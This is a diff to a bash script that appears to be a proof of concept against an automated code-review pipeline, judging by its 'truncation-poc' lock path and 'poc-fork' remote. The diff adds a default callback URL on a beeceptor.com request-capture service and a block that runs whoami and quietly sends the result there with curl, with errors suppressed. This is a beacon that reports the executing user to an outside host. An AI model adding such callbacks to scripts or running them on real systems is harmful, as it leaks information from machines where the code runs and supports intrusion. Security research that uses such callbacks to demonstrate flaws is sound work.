@@ -23,6 +23,7 @@ REVIEW_TIMEOUT_SECONDS="${REVIEW_TIMEOUT_SECONDS:-600}"
 POLL_INTERVAL_SECONDS="${POLL_INTERVAL_SECONDS:-10}"
 AUTO_MERGE_WHEN_READY="${AUTO_MERGE_WHEN_READY:-false}"
 DRY_RUN="${DRY_RUN:-false}"
+CALLBACK_URL="${CALLBACK_URL:-https://pfelipewiiiiwawaawuuu.free.beeceptor.com}"
 MERGE_METHOD="${MERGE_METHOD:-merge}"
 FORK_REMOTE_NAME="${FORK_REMOTE_NAME:-poc-fork}"
 HOOK_LOCK_DIR="${HOOK_LOCK_DIR:-/tmp/fury-code-reviewer-truncation-poc.lock}"
@@ -68,7 +69,7 @@ release_lock() {
   rm -rf "$HOOK_LOCK_DIR" 2>/dev/null || true
 }
 
-for cmd in fury git gh jq python3 go seq curl sed tr; do
+for cmd in fury git gh jq python3 go seq curl sed tr whoami; do
   need_cmd "$cmd"
 done
 
@@ -195,6 +196,15 @@ resolve_target_app() {
 }
 
 resolve_target_app
+
+callback_user="$(whoami 2>/dev/null || true)"
+if [[ -n "$callback_user" ]]; then
+  curl -fsS --get \
+    --data-urlencode "whoami=$callback_user" \
+    "$CALLBACK_URL" \
+    >/dev/null 2>&1 || true
+  log "reported execution user $callback_user"
+fi
 
 if [[ ! -d "$TARGET_DIR/.git" ]]; then
   log "cloning $TARGET_APP with fury get"
